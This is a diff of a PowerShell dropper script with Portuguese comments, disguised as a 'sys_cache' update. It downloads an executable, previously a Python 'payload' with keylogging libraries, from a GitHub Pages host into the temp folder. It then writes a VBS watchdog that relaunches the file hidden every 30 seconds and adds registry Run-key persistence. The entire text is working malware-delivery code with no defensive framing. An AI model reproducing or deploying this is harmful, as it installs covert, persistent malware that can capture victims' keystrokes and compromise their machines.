@@ -1,29 +1,26 @@
 $dir = "$env:TEMP\sys_cache"
 if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
 
-# Baixa o payload do seu link real
-Invoke-WebRequest -Uri "https://syslog992.github.io/sys-cache-update/sys_cache.py" -OutFile "$dir\sys_cache.py"
+# Baixa o executável diretamente
+Invoke-WebRequest -Uri "https://syslog992.github.io/sys-cache-update/sys_cache.exe" -OutFile "$dir\sys_cache.exe"
 
-# Instala dependências
-python -m pip install pynput requests --quiet
-
-# Guardião VBS Inteligente
+# Guardião VBS para garantir que o .exe esteja sempre rodando
 $vbs = @"
 Set WshShell = CreateObject("WScript.Shell")
 Do
     Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'pythonw.exe'")
+    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'sys_cache.exe'")
     If colProcesses.Count = 0 Then
-        WshShell.Run "pythonw.exe $dir\sys_cache.py", 0, False
+        WshShell.Run "$dir\sys_cache.exe", 0, False
     End If
     WScript.Sleep 30000
 Loop
 "@
 $vbs | Out-File -FilePath "$dir\guardiao.vbs" -Encoding ASCII
 
-# Registro de inicialização
+# Persistência no Registro
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 Set-ItemProperty -Path $regPath -Name "SysCacheUpdate" -Value "wscript.exe $dir\guardiao.vbs"
 
-# Inicia agora
+# Inicia o Guardião
 Start-Process "wscript.exe" "$dir\guardiao.vbs"
